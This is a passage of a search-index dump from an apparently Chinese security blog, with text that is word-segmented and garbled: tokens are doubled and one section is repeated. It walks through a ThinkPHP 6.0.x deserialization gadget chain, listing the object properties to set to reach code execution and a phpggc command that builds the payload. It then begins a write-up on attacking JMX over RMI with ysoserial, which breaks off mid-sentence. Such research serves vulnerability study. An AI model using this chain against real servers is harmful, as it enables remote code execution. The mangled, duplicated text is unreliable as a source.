\u70b9\u4e3a   __ destruct   \u3001   __ wakeup   \uff0c \u56e0\u4e3a \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u7684 \u8c03\u7528 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u90fd \u4f1a \u81ea\u52a8 \u8c03\u7528 \uff0c \u6240\u4ee5 \u6211\u4eec \u5148\u6765 \u627e \u6b64\u7c7b \u51fd\u6570 \u3002 \u8fd9\u91cc \u6211 \u627e \u4e86   vendor / topthink / think - orm / src / Model . php   \u7684   __ destruct   \u51fd\u6570 \u3002   public   function   __ destruct ( )   {   if   ( $ this - > lazySave )   { / /   \u6784\u9020 lazySave \u4e3a true \uff0c \u8fdb\u5165 save \u51fd\u6570   $ this - > save ( ) ;   }   }   public   function   save ( array   $ data   =   [ ] ,   string   $ sequence   =   null ) :   bool   {   / /   ...   if   ( $ this - > isEmpty ( )   | |   false   = = =   $ this - > trigger ( ' BeforeWrite ' ) )   {   return   false ;   }   $ result   =   $ this - > exists   ?   $ this - > updateData ( )   :   $ this - > insertData ( $ sequence ) ;   / /   ...   }   \u9996\u5148 \u6784\u9020   lazySave   \u7684 \u503c \u4e3a   true   , \u4ece\u800c \u8fdb\u5165   save   \u51fd\u6570 \u3002   \u8fd9\u6b21 \u89e6\u53d1 \u70b9 \u4f4d\u4e8e   updateData   \u51fd\u6570 \u5185 \uff0c \u4e3a\u4e86 \u9632\u6b62 \u524d\u9762 \u7684 \u6761\u4ef6 \u7b26\u5408 \uff0c \u800c \u76f4\u63a5 return \uff0c \u6211\u4eec \u9996\u5148 \u9700\u8981 \u6784\u9020 \u76f8\u5173 \u53c2\u6570   public   function   isEmpty ( ) :   bool   {   return   empty ( $ this - > data ) ;   }   protected   function   trigger ( string   $ event ) :   bool   {   if   ( ! $ this - > withEvent )   {   return   true ;   }   / /   ...   \u5176\u4e2d \u9700 \u4fdd\u8bc1   isEmpty   \u8fd4\u56de   false   \uff0c \u4ee5\u53ca   $ this - > trigger ( ' BeforeWrite ' )   \u8fd4\u56de   true   \u6784\u9020   $ this - > data   \u4e3a \u975e\u7a7a \u6570\u7ec4   \u6784\u9020   $ this - > withEvent   \u4e3a   false   \u6784\u9020   $ this - > exists   \u4e3a   true   \u4ece\u800c \u8fdb\u5165 \u6211\u4eec \u9700\u8981 \u7684   updateData   \u51fd\u6570 \uff0c \u6765\u770b \u4e00\u4e0b \u8be5 \u51fd\u6570 \u5185\u5bb9   protected   function   updateData ( ) :   bool   {   / /   \u4e8b\u4ef6 \u56de\u8c03   if   ( false   = = =   $ this - > trigger ( ' BeforeUpdate ' ) )   { / /   \u6b64\u5904 \u524d\u9762 \u5df2 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6   return   false ;   }   / /   ...   / /   \u83b7\u53d6 \u6709 \u66f4\u65b0 \u7684 \u6570\u636e   $ data   =   $ this - > getChangedData ( ) ;   if   ( empty ( $ data ) )   {   / /   \u5173\u8054 \u66f4\u65b0   if   ( ! empty ( $ this - > relationWrite ) )   {   $ this - > autoRelationUpdate ( ) ;   }   return   true ;   }   / /   ...   / /   \u68c0\u67e5 \u5141\u8bb8 \u5b57 \u6bb5   $ allowFields   =   $ this - > checkAllowFields ( ) ;   / /   \u89e6\u53d1 __ toString   \u540c\u6837 \u7684 \uff0c \u4e3a\u4e86 \u9632\u6b62 \u63d0\u524d   return   \uff0c \u9700\u8981 \u7b26\u5408   $ data   \u975e\u7a7a \uff0c \u6765\u770b \u4e00\u4e0b   getChangedData   public   function   getChangedData ( ) :   array   {   $ data   =   $ this - > force   ?   $ this - > data   :   array _ udiff _ assoc ( $ this - > data ,   $ this - > origin ,   function   ( $ a ,   $ b )   {   if   ( ( empty ( $ a )   | |   empty ( $ b ) )   &&   $ a   ! = =   $ b )   {   return   1 ;   }   return   is _ object ( $ a )   | |   $ a   ! =   $ b   ?   1   :   0 ;   } ) ;   / /   ...   return   $ data ;   }   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5f3a\u884c \u7f6e   $ this - > force   \u4e3a   true   \uff0c \u76f4\u63a5 \u8fd4\u56de \u6211\u4eec \u524d\u9762 \u6784\u9020 \u7684 \u975e\u7a7a   $ this - > data   \u8fd9\u6837 \uff0c \u6211\u4eec \u5c31 \u6210\u529f \u5230 \u4e86 \u8c03\u7528   checkAllowFields   \u7684 \u4f4d\u7f6e   protected   function   checkAllowFields ( ) :   array   {   / /   \u68c0\u6d4b \u5b57 \u6bb5   if   ( empty ( $ this - > field ) )   {   if   ( ! empty ( $ this - > schema ) )   {   $ this - > field   =   array _ keys ( array _ merge ( $ this - > schema ,   $ this - > jsonType ) ) ;   }   else   {   $ query   =   $ this - > db ( ) ; / /   \u6700\u7ec8 \u7684 \u89e6\u53d1 __ toString \u7684 \u51fd\u6570   $ table   =   $ this - > table   ?   $ this - > table   .   $ this - > suffix   :   $ query - > getTable ( ) ;   $ this - > field   =   $ query - > getConnection ( ) - > getTableFields ( $ table ) ;   }   return   $ this - > field ;   }   / /   ...   }   \u540c\u6837 \uff0c \u4e3a\u4e86 \u5230   $ this - > db ( )   \u51fd\u6570 \u7684 \u8c03\u7528 \uff0c \u9700\u8981   \u6784\u9020   $ this - > field   \u4e3a\u7a7a   \u6784\u9020   $ this - > schema   \u4e3a\u7a7a   \u5176\u5b9e \u8fd9 \u4e24\u4e2a \u5730\u65b9 \u4e0d \u9700\u8981 \u6784\u9020 \uff0c \u9ed8\u8ba4 \u90fd \u4e3a \u7a7a   \u6700\u7ec8 \uff0c \u6211\u4eec \u7ec8\u4e8e \u5230 \u4e86 \u53ef\u4ee5 \u89e6\u53d1   __ toString   \u7684 \u4f4d\u7f6e   public   function   db ( $ scope   =   [ ] ) :   Query   {   / * *   @ var   Query   $ query   * /   $ query   =   self : : $ db - > connect ( $ this - > connection )   - > name ( $ this - > name   .   $ this - > suffix ) / /   toString   - > pk ( $ this - > pk ) ;   \u770b\u5230 \u719f\u6089 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u4e86 \u561b \uff01 \uff01 \uff01   \u4e0d\u8fc7 \u4e3a\u4e86 \u8fbe\u5230 \u8be5\u51fa \u62fc\u63a5 \uff0c \u6211\u4eec \u8fd8\u662f \u5f97 \u9996\u5148 \u6ee1\u8db3   connect   \u51fd\u6570 \u7684 \u8c03\u7528 \u3002 \u6b64\u5904 \u4ee3\u7801 \u5c31 \u4e0d \u8bf4 \u4e86 \uff0c \u7f6e   $ this - > connection   \u4e3a   mysql   \u5373\u53ef \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u4e0d\u7ba1 \u662f \u8bbe   $ this - > name   \u8fd8\u662f   $ this - > suffix   \u4e3a \u6700\u7ec8 \u7684 \u89e6\u53d1   __ toString   \u7684 \u5bf9\u8c61 \uff0c \u90fd \u4f1a \u6709 \u540c\u6837 \u7684 \u6548\u679c \u3002   \u540e\u7eed \u7684 \u601d\u8def \uff0c \u5c31\u662f \u539f\u6765   vendor / topthink / think - orm / src / model / concern / Conversion . php   \u7684   __ toString   \u5f00\u59cb \u7684 \u5229\u7528 \u94fe \uff0c \u4e0d \u5728 \u53d9\u8ff0 \u3002   \u6211 \u628a exp \u96c6\u6210 \u5230 \u4e86   phpggc   \u4e0a \uff0c \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef \u751f\u6210   . / phpggc   - u   ThinkPHP / RCE2   ' phpinfo ( ) ; '   \u8fd9\u91cc \u7531\u4e8e \u7528\u5230 \u4e86 SerializableClosure \uff0c \u9700\u8981 \u4f7f\u7528 \u7f16\u7801 \u7801\u5668 \u7f16\u7801\u5668 \u7f16\u7801 \uff0c \u4e0d\u53ef \u76f4\u63a5 \u8f93\u51fa \u62f7\u8d1d \u5229\u7528 \u3002","title":"thinkphp   v6.0 . x   \u53cd \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x00","text":"\u4e0a \u4e00\u7bc7 \u5206\u6790 \u4e86 tp   5.2 . x \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u6316\u6398 \uff0c \u987a\u7740 \u601d\u8def \uff0c \u628a tp6.0 . x \u4e5f \u6316 \u4e86 \u3002 \u6709 \u7c7b\u4f3c \u7684 \u5730\u65b9 \uff0c \u4e5f \u6709 \u9700\u8981 \u91cd\u65b0 \u6316\u6398 \u7684 \u5730\u65b9 \u3002","title":"0x00   \u524d\u8a00"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x01","text":"\u91c7\u7528 composer \u5b89\u88c5 6.0 . * - dev \u7248\u672c   composer   create - project   topthink / think = 6.0 . x - dev   v6.0","title":"0x01   \u73af\u5883 \u51c6\u5907"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#0x02","text":"","title":"0x02   \u5229\u7528 \u94fe\u5206\u6790"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#_1","text":"\u62ff\u5230 v6.0 . x \u7248\u672c \uff0c \u7b80\u5355 \u7684 \u770b \u4e86 \u4e00\u4e0b \uff0c \u6709 \u4e00\u4e2a \u6d88\u606f \u597d\u6d88\u606f \u548c \u4e00\u4e2a \u6d88\u606f \u574f\u6d88\u606f \u3002   \u6d88\u606f \u597d\u6d88\u606f \u662f 5.2 . x \u7248\u672c \u51fd\u6570 \u52a8\u6001 \u8c03\u7528 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u94fe\u540e \u534a \u90e8\u5206 \uff0c \u8fd8 \u53ef\u4ee5 \u5229\u7528 \u3002   \u6d88\u606f \u574f\u6d88\u606f \u662f \u524d\u9762 5.1 . x \uff0c 5.2 . x \u7248\u672c \u90fd \u57fa\u4e8e \u89e6\u53d1 \u70b9   Windows   \u7c7b \u7684   __ destruct   , \u597d\u5de7 \u4e0d\u5de7 \u7684 \u662f 6.0 . x \u7248\u672c \u53d6\u6d88 \u4e86   Windows   \u7c7b \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u5f97 \u91cd\u65b0 \u627e \u4e00\u4e2a \u5408\u9002 \u7684 \u8d77\u59cb \u89e6\u53d1 \u70b9 \uff0c \u624d\u80fd \u7ee7\u7eed \u4f7f\u7528 \u4e0a\u9762 \u7684 \u6d88\u606f \u597d\u6d88\u606f \u3002","title":"\u80cc\u666f \u56de\u987e"},{"location":"blog/2019/thinkphp_6.0.x_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE/#vendortopthinkthink-ormsrcmodelphp","text":"\u4e3a\u4e86 \u8282\u7701 \u7bc7\u5e45 \uff0c \u540e\u6587 \u4e0d\u518d \u91cd\u590d \u4ecb\u7ecd \u89e6\u53d1   __ toString   \u51fd\u6570 \u540e \u7684 \u5229\u7528 \u94fe \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u540c 5.2 . x \u7248\u672c \u76f8\u540c ( \u4e0d\u8fc7 wonderkun \u5e08\u5085 \u7684 \u5229\u7528 \u94fe \u5df2 \u5931\u6548 \uff0c \u52a8\u6001 \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \u7684 \u5229\u7528 \u94fe \u8fd8 \u80fd \u7528 ) \u3002   \u901a\u5e38 \u6700\u597d \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8d77\u59cb \u70b9\u4e3a   __ destruct   \u3001   __ wakeup   \uff0c \u56e0\u4e3a \u8fd9 \u4e24\u4e2a \u51fd\u6570 \u7684 \u8c03\u7528 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u90fd \u4f1a \u81ea\u52a8 \u8c03\u7528 \uff0c \u6240\u4ee5 \u6211\u4eec \u5148\u6765 \u627e \u6b64\u7c7b \u51fd\u6570 \u3002 \u8fd9\u91cc \u6211 \u627e \u4e86   vendor / topthink / think - orm / src / Model . php   \u7684   __ destruct   \u51fd\u6570 \u3002   public   function   __ destruct ( )   {   if   ( $ this - > lazySave )   { / /   \u6784\u9020 lazySave \u4e3a true \uff0c \u8fdb\u5165 save \u51fd\u6570   $ this - > save ( ) ;   }   }   public   function   save ( array   $ data   =   [ ] ,   string   $ sequence   =   null ) :   bool   {   / /   ...   if   ( $ this - > isEmpty ( )   | |   false   = = =   $ this - > trigger ( ' BeforeWrite ' ) )   {   return   false ;   }   $ result   =   $ this - > exists   ?   $ this - > updateData ( )   :   $ this - > insertData ( $ sequence ) ;   / /   ...   }   \u9996\u5148 \u6784\u9020   lazySave   \u7684 \u503c \u4e3a   true   , \u4ece\u800c \u8fdb\u5165   save   \u51fd\u6570 \u3002   \u8fd9\u6b21 \u89e6\u53d1 \u70b9 \u4f4d\u4e8e   updateData   \u51fd\u6570 \u5185 \uff0c \u4e3a\u4e86 \u9632\u6b62 \u524d\u9762 \u7684 \u6761\u4ef6 \u7b26\u5408 \uff0c \u800c \u76f4\u63a5 return \uff0c \u6211\u4eec \u9996\u5148 \u9700\u8981 \u6784\u9020 \u76f8\u5173 \u53c2\u6570   public   function   isEmpty ( ) :   bool   {   return   empty ( $ this - > data ) ;   }   protected   function   trigger ( string   $ event ) :   bool   {   if   ( ! $ this - > withEvent )   {   return   true ;   }   / /   ...   \u5176\u4e2d \u9700 \u4fdd\u8bc1   isEmpty   \u8fd4\u56de   false   \uff0c \u4ee5\u53ca   $ this - > trigger ( ' BeforeWrite ' )   \u8fd4\u56de   true   \u6784\u9020   $ this - > data   \u4e3a \u975e\u7a7a \u6570\u7ec4   \u6784\u9020   $ this - > withEvent   \u4e3a   false   \u6784\u9020   $ this - > exists   \u4e3a   true   \u4ece\u800c \u8fdb\u5165 \u6211\u4eec \u9700\u8981 \u7684   updateData   \u51fd\u6570 \uff0c \u6765\u770b \u4e00\u4e0b \u8be5 \u51fd\u6570 \u5185\u5bb9   protected   function   updateData ( ) :   bool   {   / /   \u4e8b\u4ef6 \u56de\u8c03   if   ( false   = = =   $ this - > trigger ( ' BeforeUpdate ' ) )   { / /   \u6b64\u5904 \u524d\u9762 \u5df2 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6   return   false ;   }   / /   ...   / /   \u83b7\u53d6 \u6709 \u66f4\u65b0 \u7684 \u6570\u636e   $ data   =   $ this - > getChangedData ( ) ;   if   ( empty ( $ data ) )   {   / /   \u5173\u8054 \u66f4\u65b0   if   ( ! empty ( $ this - > relationWrite ) )   {   $ this - > autoRelationUpdate ( ) ;   }   return   true ;   }   / /   ...   / /   \u68c0\u67e5 \u5141\u8bb8 \u5b57 \u6bb5   $ allowFields   =   $ this - > checkAllowFields ( ) ;   / /   \u89e6\u53d1 __ toString   \u540c\u6837 \u7684 \uff0c \u4e3a\u4e86 \u9632\u6b62 \u63d0\u524d   return   \uff0c \u9700\u8981 \u7b26\u5408   $ data   \u975e\u7a7a \uff0c \u6765\u770b \u4e00\u4e0b   getChangedData   public   function   getChangedData ( ) :   array   {   $ data   =   $ this - > force   ?   $ this - > data   :   array _ udiff _ assoc ( $ this - > data ,   $ this - > origin ,   function   ( $ a ,   $ b )   {   if   ( ( empty ( $ a )   | |   empty ( $ b ) )   &&   $ a   ! = =   $ b )   {   return   1 ;   }   return   is _ object ( $ a )   | |   $ a   ! =   $ b   ?   1   :   0 ;   } ) ;   / /   ...   return   $ data ;   }   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5f3a\u884c \u7f6e   $ this - > force   \u4e3a   true   \uff0c \u76f4\u63a5 \u8fd4\u56de \u6211\u4eec \u524d\u9762 \u6784\u9020 \u7684 \u975e\u7a7a   $ this - > data   \u8fd9\u6837 \uff0c \u6211\u4eec \u5c31 \u6210\u529f \u5230 \u4e86 \u8c03\u7528   checkAllowFields   \u7684 \u4f4d\u7f6e   protected   function   checkAllowFields ( ) :   array   {   / /   \u68c0\u6d4b \u5b57 \u6bb5   if   ( empty ( $ this - > field ) )   {   if   ( ! empty ( $ this - > schema ) )   {   $ this - > field   =   array _ keys ( array _ merge ( $ this - > schema ,   $ this - > jsonType ) ) ;   }   else   {   $ query   =   $ this - > db ( ) ; / /   \u6700\u7ec8 \u7684 \u89e6\u53d1 __ toString \u7684 \u51fd\u6570   $ table   =   $ this - > table   ?   $ this - > table   .   $ this - > suffix   :   $ query - > getTable ( ) ;   $ this - > field   =   $ query - > getConnection ( ) - > getTableFields ( $ table ) ;   }   return   $ this - > field ;   }   / /   ...   }   \u540c\u6837 \uff0c \u4e3a\u4e86 \u5230   $ this - > db ( )   \u51fd\u6570 \u7684 \u8c03\u7528 \uff0c \u9700\u8981   \u6784\u9020   $ this - > field   \u4e3a\u7a7a   \u6784\u9020   $ this - > schema   \u4e3a\u7a7a   \u5176\u5b9e \u8fd9 \u4e24\u4e2a \u5730\u65b9 \u4e0d \u9700\u8981 \u6784\u9020 \uff0c \u9ed8\u8ba4 \u90fd \u4e3a \u7a7a   \u6700\u7ec8 \uff0c \u6211\u4eec \u7ec8\u4e8e \u5230 \u4e86 \u53ef\u4ee5 \u89e6\u53d1   __ toString   \u7684 \u4f4d\u7f6e   public   function   db ( $ scope   =   [ ] ) :   Query   {   / * *   @ var   Query   $ query   * /   $ query   =   self : : $ db - > connect ( $ this - > connection )   - > name ( $ this - > name   .   $ this - > suffix ) / /   toString   - > pk ( $ this - > pk ) ;   \u770b\u5230 \u719f\u6089 \u7684 \u5b57\u7b26 \u5b57\u7b26\u4e32 \u62fc\u63a5 \u4e86 \u561b \uff01 \uff01 \uff01   \u4e0d\u8fc7 \u4e3a\u4e86 \u8fbe\u5230 \u8be5\u51fa \u62fc\u63a5 \uff0c \u6211\u4eec \u8fd8\u662f \u5f97 \u9996\u5148 \u6ee1\u8db3   connect   \u51fd\u6570 \u7684 \u8c03\u7528 \u3002 \u6b64\u5904 \u4ee3\u7801 \u5c31 \u4e0d \u8bf4 \u4e86 \uff0c \u7f6e   $ this - > connection   \u4e3a   mysql   \u5373\u53ef \u3002 \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u4e0d\u7ba1 \u662f \u8bbe   $ this - > name   \u8fd8\u662f   $ this - > suffix   \u4e3a \u6700\u7ec8 \u7684 \u89e6\u53d1   __ toString   \u7684 \u5bf9\u8c61 \uff0c \u90fd \u4f1a \u6709 \u540c\u6837 \u7684 \u6548\u679c \u3002   \u540e\u7eed \u7684 \u601d\u8def \uff0c \u5c31\u662f \u539f\u6765   vendor / topthink / think - orm / src / model / concern / Conversion . php   \u7684   __ toString   \u5f00\u59cb \u7684 \u5229\u7528 \u94fe \uff0c \u4e0d \u5728 \u53d9\u8ff0 \u3002   \u6211 \u628a exp \u96c6\u6210 \u5230 \u4e86   phpggc   \u4e0a \uff0c \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef \u751f\u6210   . / phpggc   - u   ThinkPHP / RCE2   ' phpinfo ( ) ; '   \u8fd9\u91cc \u7531\u4e8e \u7528\u5230 \u4e86 SerializableClosure \uff0c \u9700\u8981 \u4f7f\u7528 \u7f16\u7801 \u7801\u5668 \u7f16\u7801\u5668 \u7f16\u7801 \uff0c \u4e0d\u53ef \u76f4\u63a5 \u8f93\u51fa \u62f7\u8d1d \u5229\u7528 \u3002","title":"vendor / topthink / think - orm / src / Model . php   \u65b0 \u8d77\u59cb \u89e6\u53d1 \u70b9"},{"location":"blog/2020/java-jmx-rmi-20200310/","tags":["java"],"text":"0x00   \u524d\u8a00   RMI \u7684 \u4e00\u4e2a \u91cd\u8981 \u5e94\u7528 \u662f JMX ( Java   Management   Extentions ) \uff0c \u672c\u6587 \u4ecb\u7ecd JMX \u7684 \u4e24\u4e2a \u653b\u51fb \u653b\u51fb\u9762 \uff1a \uff09   0x01   \u57fa\u7840   \u5728 \u5199 \u4e00\u534a \u7684 \u65f6\u5019 \uff0c \u53d1\u73b0 \u4e86 \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0 \uff0c \u611f\u89c9 \u5199 \u7684 \u5f88 \u597d \uff0c \u53ef\u4ee5 \u770b\u770b \uff1a https : / / mogwailabs . de / blog / 2019 / 04 / attacking - rmi - based - jmx - services /   JMX   Java   Management   Extensions   ( JMX )   is   a   Java   technology   that   supplies   tools   for   managing   and   monitoring   applications ,   system   objects ,   devices   ( such   as   printers )   and   service - oriented   networks .   MBean   JMX   allows   you   to   manage   resources   as   managed   beans .   A   managed   bean   ( MBean )   is   a   Java   Bean   class   that   follows   certain   design   rules   of   the   JMX   standard .   An   MBean   can   represent   a   device ,   an   application ,   or   any   resource   that   needs   to   be   managed   over   JMX .   You   can   access   these   MBeans   via   JMX ,   query   attributes   and   invoke   Bean   methods .   The   JMX   standard   differs   between   various   MBean   types   however ,   we   will   only   deal   with   the   standard   MBeans   here .   To   be   a   valid   MBean ,   a   Java   class   must :   Implement   an   interface   Provide   a   default   constructor   ( without   any   arguments )   Follow   certain   naming   conventions ,   for   example   implement   getter / setter   methods   to   read / write   attributes   \u8fd9\u91cc \u63d0 \u4e00\u4e0b \uff0c \u5f53 MBean \u7684 \u540d\u5b57 \u4e3a   Hello   \u65f6 \uff0c \u5176 \u76f8\u5e94 \u7684 interface \u540d \u5fc5\u987b \u4e3a   HelloMBean   \uff0c \u4e0d\u7136 \u7b97 \u4e0d \u5408\u6cd5 \u7684 MBean   MBean   Server   A   MBean   server   is   a   service   that   manages   the   MBeans   of   a   system .   Developers   can   register   their   MBeans   in   the   server   following   a   specific   naming   pattern .   The   MBean   server   will   forward   incoming   messages   to   the   registered   MBeans .   The   service   is   also   responsible   to   forward   messages   from   MBeans   to   external   components .   DEMO \u7528 \u53c2\u8003 \u91cc \u7684 \uff0c \u7528   jconsole   \u770b\u770b \u7ed3\u679c   \u5728 JConsole \u91cc \u53ef\u4ee5 \u5bf9 \u5f53\u524d \u6ce8\u518c \u7684 MBean \u8fdb\u884c \u64cd\u4f5c \uff0c \u5982\u4e0a \u4e0a\u56fe \u5982\u4e0a\u56fe \u8c03\u7528   sayHello   \u51fd\u6570   \u5f53\u524d \u6211\u4eec \u8fde \u7684 \u662f \u672c\u5730 \u7684 MBean   Server ( \u6bcf\u4e2a java \u8fdb\u7a0b \u5728 \u672c\u5730 \u90fd \u4f1a \u6709 \u4e00\u4e2a MBean   Server ) \uff0c \u6211\u4eec \u4e5f \u53ef\u4ee5 \u5c06 MBean   Server \u6302\u8f7d \u5230 \u67d0 \u4e00 \u7aef\u53e3 \u4e0a \uff0c \u63d0\u4f9b \u8fdc\u7a0b \u7684 MBean \u7ba1\u7406 \u3002   \u8fd0\u884c jar \u65f6 \u5e26\u4e0a   - Dcom . sun . management . jmxremote . port = 2222   - Dcom . sun . management . jmxremote . authenticate = false   - Dcom . sun . management . jmxremote . ssl = false   \u76f4\u63a5 \u901a\u8fc7 JConsole \u6765 \u8fde\u63a5 \uff0c \u4f1a \u63d0\u793a \u4f60 \u6709 \u4e24\u79cd \u65b9\u6cd5 1 :   host : port   ; 2 :   service : jmx : < protocol > : < sap >   \u8fd9\u91cc \u6211\u4eec \u91cd\u70b9 \u8981 \u8bb2 \u7684 \u5c31\u662f \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u6cd5 \uff0c \u9996\u5148 \u6211\u4eec \u5148 \u6765\u770b \u4e00\u4e0b jmx \u5efa\u7acb \u8d77 2222 \u7aef\u53e3 \u540e \uff0c \u7528 nmap \u6765 \u83b7\u53d6 \u5176 \u5185\u5bb9 \u662f \u600e\u4e48 \u600e\u4e48\u6837 \u7684   \u4ece \u7ed3\u679c \u6765\u770b \uff0c JMX \u7684 MBean   Server \u662f \u5efa\u7acb \u5728 RMI \u7684 \u57fa\u7840 \u4e0a \u7684 \uff0c \u5e76\u4e14 \u5176 RMI   Registy \u6ce8\u518c \u7684 \u540d\u5b57 \u53eb   jmxrmi   \u3002   \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u6cd5 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 \u6307\u5b9a \u5177\u4f53 \u7684 \u534f\u8bae \u6765 \u8ddf Server \u7aef \u8fdb\u884c \u8fde\u63a5 \uff0c \u53c2\u8003   JMX   RMI   connector   API   There   are   two   forms   for   RMI   connector   addresses :   In   the   JNDI   form   ,   the   URL   indicates   where   to   find   an   RMI   stub   for   the   connector   .   This   RMI   stub   is   a   Java   object   of   type   RMIServer   that   gives   remote   access   to   the   connector   server .   With   this   address   form ,   the   RMI   stub   is   obtained   from   an   external   directory   entry   included   in   the   URL .   An   external   directory   is   any   directory   recognized   by   JNDI   ,   typically   the   RMI   registry ,   LDAP ,   or   COS   Naming .   In   the   encoded   form   ,   the   URL   directly   includes   the   information   needed   to   connect   to   the   connector   server .   When   using   RMI / JRMP ,   the   encoded   form   is   the   serialized   RMI   stub   for   the   server   object ,   encoded   using   BASE64   without   embedded   newlines .   When   using   RMI / IIOP ,   the   encoded   form   is   the   CORBA   IOR   for   the   server   object .   \u8fd9\u91cc \u7684 encoded   form \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u5b9e\u5728 \u53d1\u8d77 \u7aef \u8fdb\u884c \u7684 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4e0d \u8003\u8651 \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u5f62\u5f0f \u3002   \u5bf9\u4e8e JNDI \u7684 \u5f62\u5f0f \uff0c \u6709 \u4ee5\u4e0b \u51e0\u79cd \u65b9\u6cd5 \u8ddf JMX   Server \u53bb \u8fde\u63a5 \uff1a   Connector \u652f\u6301 JRMP \u548c iiop \u4f5c\u4e3a \u8fde\u63a5 \u5c42 \u7684 \u534f\u8bae \uff0c \u6240\u4ee5 \u5bf9\u5e94 \u7684 \u6709 \u4e24\u79cd \u65b9\u5f0f   1 .   service : jmx : rmi : / / host : port /   2 .   service : jmx : iiop : / / host : port /   \u6b64\u5916 \uff0c \u8fd8\u6709 \u57fa\u4e8e \u76ee\u5f55 \u6761 \u76ee\u7684 connectors   1 .   service : jmx : rmi : / / host : port / jndi / jndi - name   2 .   service : jmx : iiop : / / host : port / jndi / jndi - name   \u6bd4\u5982   serivce : jmx : rmi : / / < \u53ef \u5ffd\u7565 \u7684 host > / jndi / rmi : / / host : port / jmxrmi   \u8fd9\u79cd \u65b9\u5f0f \u5c31 \u53ef\u4ee5 \u4f7f\u7528 jndi \u4e0b \u7684 \u6240\u6709 spi \u6765 \u8fdb\u884c \u8fde\u63a5   0x02   \u653b\u51fb JMX   1 .   \u653b\u51fb JMX - RMI   CVE - 2016 - 3427   \u7531\u4e8e JMX \u8ba4\u8bc1 \u65f6 \u4f20\u9012 \u7684 \u662f HashMap \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \uff0c \u800c \u4ee5 HashMap \u53ef\u4ee5 \u76f4\u63a5 \u6784\u9020 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6765 \u653b\u51fb \u672c\u5730 ClassPath \uff0c \u8fd9\u91cc \u5df2\u7ecf \u4fee\u590d \u4e86 \u4e0d\u7ec6 \u8bb2 \u4e86 XD   \u4e3b\u52a8 \u653b\u51fb \u4e3b\u52a8\u653b\u51fb 1   \uff1a \u5229\u7528 RMI   Registy \u6536\u5230 \u8fdc\u7a0b bind \u65f6 \u4ea7\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e   jdk < 8u141 _ b10 ( \u5e76\u4e14 check   host \u7684 \u987a\u5e8f \u53d8 \u4e86 \uff0c \u8be6\u7ec6 \u53ef\u4ee5 \u770b   \u8fd9\u91cc   ) \uff0c   8u141 _ b10 \u4fee\u6539 \u540e   SingleEntryRegistry \u589e\u52a0 \u4e86 filter   \u9650\u5236 \u4e86 \u63a5\u53d7 \u5230 \u7684 \u4e0d\u80fd \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u7684 \u5bf9\u8c61 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u4e0d\u80fd \u5229\u7528 registry \u8fd9\u79cd \u65b9\u5f0f \u6765 \u8fbe\u6210 \u5229\u7528 \u4e86 \u3002   \u4e3b\u52a8 \u653b\u51fb \u4e3b\u52a8\u653b\u51fb 2   : \u5229\u7528 RMI   DGC \u5b9e\u73b0 \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u53ef \u5728 JEP   290 \u4e4b\u524d \u7684 \u7248\u672c \u653b\u51fb \u6210\u529f ( \u4f7f\u7528 ysoserial \u7684 JRMPClient \uff0c \u5206\u6790 \u4e5f \u89c1   \u8fd9\u91cc   0x08 \u90e8\u5206 )   \u524d\u9762 \u4e24\u79cd \u65b9\u5f0f \uff0c \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 JDK8 